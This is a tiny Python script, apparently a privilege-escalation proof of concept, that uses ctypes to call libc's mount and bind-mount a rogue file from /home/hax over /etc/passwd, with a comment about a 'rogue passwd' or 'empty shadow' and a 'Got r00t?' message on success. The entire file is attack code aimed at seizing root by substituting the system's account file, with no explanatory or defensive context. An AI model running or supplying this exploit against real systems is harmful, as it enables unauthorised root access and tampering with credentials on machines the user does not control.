#!/usr/bin/python3

from ctypes import *

BIND_MOUNT = 4096

libc = CDLL("libc.so.6")

# rogue passwd /or/ empty shadow
ret = libc.mount( b"/home/hax/passwd", b"/etc/passwd", "ext4", BIND_MOUNT, 0)

if ret == 0:
    print("Got r00t?")
else:
    print("Failed :(")

